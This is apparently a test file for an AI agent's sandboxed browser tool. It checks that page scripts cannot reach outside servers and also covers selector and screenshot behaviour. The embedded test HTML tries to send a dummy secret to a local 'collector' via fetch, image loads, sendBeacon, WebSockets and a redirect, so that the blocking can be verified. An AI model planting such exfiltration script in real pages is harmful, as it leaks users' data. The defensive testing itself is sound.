/** Prueba de aislamiento del navegador: node chat/prueba-navegador-aislamiento.mjs */
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import http from "node:http";
import { NavegadorLocal } from "./navegador.mjs";

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "bonsai-browser-security-"));
const root = path.join(tmp, "project"), output = path.join(tmp, "screenshots");
fs.mkdirSync(root);
const collectorHits = [], appHits = [];
const collector = http.createServer((req, res) => { collectorHits.push(req.url); res.end("collector"); });
collector.on("upgrade", (req, socket) => { collectorHits.push(`ws:${req.url}`); socket.destroy(); });
const listen = (server) => new Promise((resolve) => server.listen(0, "127.0.0.1", () => resolve(server.address().port)));
const collectorPort = await listen(collector);
const html = `<!doctype html><title>Prueba</title>
<button>Primero</button><button>Segundo</button><button id="duplicate">Tercero</button><button id="duplicate">Cuarto</button>
<div><input name="nombre"><input name="nombre"></div><p id="result">0</p>
<div id="oculto" style="display:none">no visible</div>
<button id="boton-oculto" style="display:none">Oculto</button>
<script>
document.querySelectorAll('button').forEach((e,i)=>e.onclick=()=>document.querySelector('#result').textContent=String(i+1));
const secret='DATO_FICTICIO';
fetch('/ok').then(r=>r.text()).then(t=>document.body.dataset.sameOrigin=t);
fetch('http://127.0.0.1:${collectorPort}/fetch?data='+secret,{mode:'no-cors'}).catch(()=>{});
new Image().src='http://127.0.0.1:${collectorPort}/image?data='+secret;
navigator.sendBeacon('http://127.0.0.1:${collectorPort}/beacon',secret);
try { new WebSocket('ws://127.0.0.1:${collectorPort}/websocket?data='+secret); } catch {}
try { new WebSocket('ws://'+location.host+'/websocket?data='+secret); } catch {}
fetch('/redirect').catch(()=>{});
</script>`;
fs.writeFileSync(path.join(root, "index.html"), html);
const app = http.createServer((req, res) => {
  appHits.push(req.url);
  if (req.url === "/redirect") { res.writeHead(302, { Location: `http://127.0.0.1:${collectorPort}/redirected?data=DATO_FICTICIO` }); return res.end(); }
  if (req.url === "/ok") return res.end("ok");
  res.setHeader("Content-Type", "text/html"); res.end(html);
});
app.on("upgrade", (req, socket) => { appHits.push(`ws:${req.url}`); socket.destroy(); });
const appPort = await listen(app);
const nav = new NavegadorLocal({ root, output, blockedPorts: [8080, 8787], policy: "aislado" });
try {
  let state = JSON.parse((await nav.run({ accion: "abrir", url: `http://127.0.0.1:${appPort}/` })).texto);
  await nav.page.waitForTimeout(500);
  assert.equal(await nav.page.locator("body").getAttribute("data-same-origin"), "ok", "se permite fetch al servidor seleccionado");
  assert.equal(collectorHits.length, 0, `no debe enviarse nada al colector: ${collectorHits}`);
  assert.ok(!appHits.some((hit) => hit.startsWith("ws:")), "tampoco se permite WebSocket al origen propio");
  assert.equal(await nav.page.evaluate(() => typeof RTCPeerConnection), "undefined");
  assert.equal(await nav.page.evaluate(() => typeof WebTransport), "undefined");
  assert.equal(await nav.page.evaluate(() => typeof Worker), "undefined");
  assert.equal(await nav.page.evaluate(() => typeof SharedWorker), "undefined");
  assert.ok(appHits.includes("/ok"));
  for (const [i, control] of state.controles.filter((c) => c.etiqueta.includes("Primero") || c.etiqueta.includes("Segundo") || c.etiqueta.includes("Tercero") || c.etiqueta.includes("Cuarto")).entries()) {
    assert.equal(await nav.page.locator(control.selector).count(), 1, `selector no único: ${control.selector}`);
    state = JSON.parse((await nav.run({ accion: "clic", selector: control.selector })).texto);
    assert.equal(await nav.page.locator("#result").innerText(), String(i + 1));
  }
  for (const control of state.controles.filter((c) => c.selector.includes("input"))) assert.equal(await nav.page.locator(control.selector).count(), 1);
  const inspected = JSON.parse((await nav.run({ accion: "inspeccionar", selector: "button" })).texto);
  assert.equal(inspected.elementos.length, 5, "se inspeccionan todos los botones, incluido el oculto");
  for (const item of inspected.elementos) assert.equal(await nav.page.locator(item.selector).count(), 1);
  assert.equal(inspected.elementos.filter((e) => e.visible === false).length, 1, "el botón oculto se marca como no visible");
  await assert.rejects(nav.run({ accion: "abrir", url: `http://127.0.0.1:${appPort}/redirect` }), /ERR|net::|navigation/i);
  await nav.page.waitForTimeout(300);
  assert.equal(collectorHits.length, 0, `la redirección no debe llegar al colector: ${collectorHits}`);
  state = JSON.parse((await nav.run({ accion: "abrir", ruta: "index.html" })).texto);
  await nav.page.waitForTimeout(300);
  assert.equal(collectorHits.length, 0, `el HTML estático tampoco puede enviar datos: ${collectorHits}`);
  assert.ok(state.eventos.some((e) => e.tipo === "bloqueado"));

  // BUG-03: si el selector de captura no existe o está oculto, el mensaje tiene que
  // decir eso (antes decía "elige un elemento más pequeño" y desorientaba al modelo).
  await assert.rejects(nav.run({ accion: "captura", selector: "#no-existe" }), /no existe ningún elemento/i);
  await assert.rejects(nav.run({ accion: "captura", selector: "#oculto" }), /no está visible/i);
  await assert.rejects(nav.run({ accion: "captura", selector: "#boton-oculto" }), /no está visible/i);
  const recorte = JSON.parse((await nav.run({ accion: "captura", selector: "#result" })).texto);
  assert.ok(/\.png$/.test(recorte.captura), "un elemento visible pequeño sí se captura");

  // BUG-02: Playwright puede devolver viewportSize() === null; sin el fallback
  // 1280x800, `current.width` lanzaba TypeError y la acción moría.
  const viewportReal = nav.page.viewportSize.bind(nav.page);
  nav.page.viewportSize = () => null;
  try {
    await nav.run({ accion: "inspeccionar", ancho: 1000 });
  } finally {
    nav.page.viewportSize = viewportReal;
  }
  assert.deepEqual(nav.page.viewportSize(), { width: 1000, height: 800 }, "viewportSize null usa el fallback y aplica el ancho pedido");

  console.log("Navegador: solicitudes entre orígenes, redirecciones y WebSocket bloqueados; misma aplicación, selectores y clics verificados; selector de captura inexistente/oculto y viewportSize null cubiertos.");
} finally {
  await nav.close();
  await Promise.all([new Promise((r) => app.close(r)), new Promise((r) => collector.close(r))]);
  fs.rmSync(tmp, { recursive: true, force: true });
}
